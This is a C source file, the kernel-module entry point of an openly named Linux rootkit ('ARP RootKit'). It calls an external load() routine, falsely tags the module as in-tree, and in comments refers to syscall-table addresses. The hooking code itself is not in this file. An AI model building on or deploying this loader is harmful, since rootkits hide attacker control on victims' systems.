/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * This contains the LKM init and cleanup routines, to have it cleaner,
 * in just only 1 file.
 */

#include <linux/module.h>       /* Needed by all modules */
#include <linux/moduleparam.h>

extern int load(void);

//extern long image_sct, image_ia32sct, image_text;
//extern size_t text_size;

// We can not use module_param, as struct kernel_param, varies between trees and it has struct module, that varies a lot.
// So, we write a file that we're going to open here.
//module_param(image_text, ulong, 0);     // address of .text in vmlinux
//module_param(image_sct, ulong, 0);      // address of sys_call_table in vmlinux
//module_param(image_ia32sct, ulong, 0);  // address of ia32_sys_call_table in vmlinux
//module_param(text_size, ulong, 0);      // section .text size (from vmlinux)

int init_module(void) {
	printk("hello!\n");
	//printk("__builtin_return_address(0) = %d\n", __builtin_return_address(0));
	//printk("PAGE_KERNEL_NOENC = %x\n", PAGE_KERNEL_NOENC);
	//printk("PAGE_KERNEL_EXEC_NOENC = %x\n", PAGE_KERNEL_EXEC_NOENC);
	return load();
}

void cleanup_module(void) {
}

MODULE_LICENSE("GPL");
MODULE_INFO(intree, "Y");
//MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
//MODULE_DESCRIPTION("This is the loader of the rootkit's kernel (kernel.c).");
